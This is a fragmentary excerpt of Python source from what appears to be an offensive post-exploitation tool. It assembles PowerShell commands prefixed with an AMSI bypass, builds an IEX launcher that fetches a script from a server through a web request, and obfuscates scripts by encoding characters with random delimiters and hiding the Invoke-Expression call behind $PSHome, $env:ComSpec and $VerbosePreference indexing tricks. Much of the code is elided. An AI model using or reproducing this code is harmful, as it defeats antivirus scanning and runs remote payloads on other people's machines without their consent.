...
""".format(command=amsi_bypass + ps_command)
    ...
    logging.debug(f'Generated PS command:\n {command}\n')
...
$request.GetResponse()'''.format(server=context.server,
    ...
    logging.debug(f'Generated PS IEX Launcher:\n {launcher}\n')
...
def invoke_obfuscation(scriptString):
    ...
    delimitedEncodedArray = ''.join(
        str(ord(char)) + choice(randomDelimiters) for char in scriptString
    )
    ...
    randomDelimitersToPrint = ''.join(test)
    ...
    baseScriptArray = [f'[{charStr}[]]' + choice(['', ' ']) + encodedArray]
    ...
    invokeExpressionSyntax = [choice(['IEX', 'Invoke-Expression'])]
    ...
    invokeExpressionSyntax.append(
        f"{invocationOperator}( $PSHome["
        + choice(['4', '21'])
        + "]+$PSHOME["
        + choice(['30', '34'])
        + "]+'x')"
    ...
    invokeExpressionSyntax.append(
        f"{invocationOperator}( $env:ComSpec[4,"
        + choice(['15', '24', '26'])
        + ",25]-Join'')"
    )

    invokeExpressionSyntax.append(
        f"{invocationOperator}(("
    ...
    invokeExpressionSyntax.append(
        f"{invocationOperator}( "
        + choice(
            ['$VerbosePreference.ToString()', '([String]$VerbosePreference)']
        )
        + "[1,3]+'x'-Join'')"
    )
